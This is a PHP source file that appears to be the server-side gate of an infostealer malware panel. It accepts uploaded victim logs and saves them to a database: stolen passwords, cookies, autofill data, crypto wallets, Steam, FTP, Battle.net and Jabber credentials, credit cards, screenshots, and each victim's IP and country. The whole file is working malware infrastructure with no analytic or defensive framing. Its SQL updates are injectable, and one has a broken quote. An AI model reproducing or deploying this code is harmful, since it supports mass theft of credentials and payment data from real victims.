<?php
//error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('max_input_vars', 100000000);
ini_set('post_max_size', 0);
ini_set("memory_limit","500M");

require("mysql.php");
require("functions.php");

require("geo/SxGeo.php");

function ipToCountry($ip)
{
	$SxGeo = new SxGeo('geo/SxGeo.dat');
	$code = $SxGeo->get($ip);
	return $code."|".code_to_country($code);
}

if(isset($_POST['logs'])){
	$logs = base64decrypt($_POST['logs']);
	$array = json_decode($logs, true);
		
	$zip = base64decrypt($array['log']);
	$screenshot = base64decrypt($array['screenshot']);
	$country = ipToCountry($_SERVER['REMOTE_ADDR']);
	
    $autofill = $array['autofill'];
    $passwords = $array['passwords'];
    $cookies = $array['cookies'];
    $crypto = $array['crypto'];
    $steam = $array['steam'];
    $ftp = $array['ftp'];
    $battlenet = $array['battlenet'];
    $jabber = $array['jabber'];
    $cc = $array['cc'];
	$uid = md5(random_bytes(1337));
        
    $sans = $base->query("SELECT * FROM `stat`");
    $srow = $sans->fetchAll();
    $tempdata = $srow[0];
	file_put_contents('./screenshots/'.$uid.'.bmp', $screenshot);
        
    $base->query("UPDATE `stat` SET `autofill`=`autofill` + '".$autofill."'");
    $base->query("UPDATE `stat` SET `passwords`=`passwords` + '".$passwords."'");
    $base->query("UPDATE `stat` SET `cookies`=`cookies` + '".$cookies."'");
    $base->query("UPDATE `stat` SET `crypto`=`crypto` + '".$crypto."'");
    $base->query("UPDATE `stat` SET `steam`=`steam` + '".$steam."'");
    $base->query("UPDATE `stat` SET `ftp`=`ftp`+ '".$ftp."'");
    $base->query("UPDATE `stat` SET `battlenet`=`battlenet + '".$battlenet."'");
    $base->query("UPDATE `stat` SET `jabber`=`jabber`+ '".$jabber."'");
    $base->query("UPDATE `stat` SET `cc`=`cc`+ '".$cc."'");

	$param = ['uid' => $uid, 'ip' => $_SERVER['REMOTE_ADDR'], 'file' => base64_encode($zip), 'country' => $country, 'autofill' => $autofill, 'passwords' => $passwords, 'cookies' => $cookies, 'crypto' => $crypto, 'steam' => $steam, 'ftp' => $ftp, 'battlenet' => $battlenet, 'jabber' => $jabber, 'cc' => $cc];
	$query = $base->prepare("INSERT INTO `users` (uid, ip, country, file, autofill, passwords, cookies, crypto, steam, ftp, battlenet, jabber, cc) VALUES  (:uid, :ip, :country, :file, :autofill, :passwords, :cookies, :crypto, :steam, :ftp, :battlenet, :jabber, :cc)");
	$query->execute($param);
}

?>